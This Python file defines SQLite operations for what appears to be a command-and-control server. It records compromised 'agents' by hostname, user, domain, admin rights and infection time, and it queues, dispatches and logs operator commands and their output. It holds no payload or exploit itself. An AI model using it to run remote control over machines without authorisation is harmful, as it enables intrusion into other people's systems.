"""
Database Operations
CRUD operations for the database
"""

import sqlite3
from datetime import datetime
from database.models import get_database_path

class AgentDatabase:
    def __init__(self):
        self.db_path = get_database_path()
    
    def register_agent(self, agent_data):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            REPLACE INTO agents 
            (uuid, hostname, username, domain, admin, pid, infected, last_seen) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            agent_data['uuid'],
            agent_data['hostname'],
            agent_data['username'],
            agent_data['domain'],
            agent_data['admin'],
            agent_data['pid'],
            agent_data['infected'],
            agent_data['infected']
        ))
        conn.commit()
        conn.close()
    
    def update_last_seen(self, uuid, timestamp):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE agents SET last_seen = ? WHERE uuid = ?
        ''', (timestamp, uuid))
        conn.commit()
        conn.close()
    
    def set_command(self, uuid, command):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE agents SET command = ? WHERE uuid = ?
        ''', (command, uuid))
        conn.commit()
        conn.close()
    
    def get_command(self, uuid):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT command FROM agents WHERE uuid = ?
        ''', (uuid,))
        row = cursor.fetchone()
        conn.close()
        return row[0] if row else ""
    
    def set_command_output(self, uuid, output):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE agents SET cmdout = ? WHERE uuid = ?
        ''', (output, uuid))
        conn.commit()
        conn.close()
    
    def get_all_agents(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT uuid, hostname, username, domain, admin, pid, infected, last_seen, cmdout 
            FROM agents
        ''')
        agents = []
        for row in cursor.fetchall():
            agents.append({
                "uuid": row[0],
                "hostname": row[1],
                "username": row[2],
                "domain": row[3],
                "admin": row[4],
                "pid": row[5],
                "infected": row[6],
                "last_seen": row[7],
                "cmdout": row[8]
            })
        conn.close()
        return agents
    
    def get_agent_count(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM agents')
        count = cursor.fetchone()[0]
        conn.close()
        return count
    
    def delete_agent(self, uuid):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT uuid FROM agents WHERE uuid = ?
        ''', (uuid,))
        agent_exists = cursor.fetchone()
        if agent_exists:
            cursor.execute('''
                DELETE FROM agents WHERE uuid = ?
            ''', (uuid,))
            conn.commit()
            conn.close()
            return True
        else:
            conn.close()
            return False
    
    def add_command_history(self, uuid, command, output='', operator='', timestamp=None, status='completed'):
        if timestamp is None:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO command_history (uuid, command, output, operator, status, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (uuid, command, output, operator, status, timestamp))
        history_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return history_id

    def add_task_to_queue(self, uuid, command, operator=''):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO command_history (uuid, command, output, operator, status, timestamp)
            VALUES (?, ?, '', ?, 'queued', ?)
        ''', (uuid, command, operator, timestamp))
        task_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return task_id

    def get_next_task(self, uuid):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, command FROM command_history
            WHERE uuid = ? AND status = 'dispatched'
            ORDER BY id ASC LIMIT 1
        ''', (uuid,))
        row = cursor.fetchone()
        if row:
            conn.close()
            return {'id': row[0], 'command': row[1]}
        cursor.execute('''
            SELECT id, command FROM command_history
            WHERE uuid = ? AND status = 'queued'
            ORDER BY id ASC LIMIT 1
        ''', (uuid,))
        row = cursor.fetchone()
        conn.close()
        if row:
            return {'id': row[0], 'command': row[1]}
        return None

    def dispatch_task(self, task_id):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE command_history SET status = 'dispatched'
            WHERE id = ? AND status = 'queued'
        ''', (task_id,))
        conn.commit()
        conn.close()

    def complete_task(self, task_id, output):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE command_history SET status = 'completed', output = ?
            WHERE id = ?
        ''', (output, task_id))
        conn.commit()
        conn.close()

    def complete_task_by_uuid(self, uuid, output):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE command_history SET status = 'completed', output = ?
            WHERE id = (
                SELECT id FROM command_history
                WHERE uuid = ? AND status = 'dispatched'
                ORDER BY id ASC LIMIT 1
            )
        ''', (output, uuid))
        conn.commit()
        conn.close()

    def get_pending_task_count(self, uuid):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT COUNT(*) FROM command_history
            WHERE uuid = ? AND status IN ('queued', 'dispatched')
        ''', (uuid,))
        count = cursor.fetchone()[0]
        conn.close()
        return count

    def get_command_history(self, uuid, limit=200):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT command, output, operator, timestamp, status
            FROM command_history
            WHERE uuid = ?
            ORDER BY id ASC
            LIMIT ?
        ''', (uuid, limit))
        history = []
        for row in cursor.fetchall():
            history.append({
                'command': row[0],
                'output': row[1],
                'operator': row[2],
                'timestamp': row[3],
                'status': row[4]
            })
        conn.close()
        return history

    def delete_agent_history(self, uuid):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM command_history WHERE uuid = ?', (uuid,))
        conn.commit()
        conn.close()

    def get_agent_by_uuid(self, uuid):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT uuid, hostname, username, domain, admin, pid, infected, last_seen, cmdout 
            FROM agents WHERE uuid = ?
        ''', (uuid,))
        row = cursor.fetchone()
        conn.close()
        if row:
            return {
                "uuid": row[0],
                "hostname": row[1],
                "username": row[2],
                "domain": row[3],
                "admin": row[4],
                "pid": row[5],
                "infected": row[6],
                "last_seen": row[7],
                "cmdout": row[8]
            }
        return None
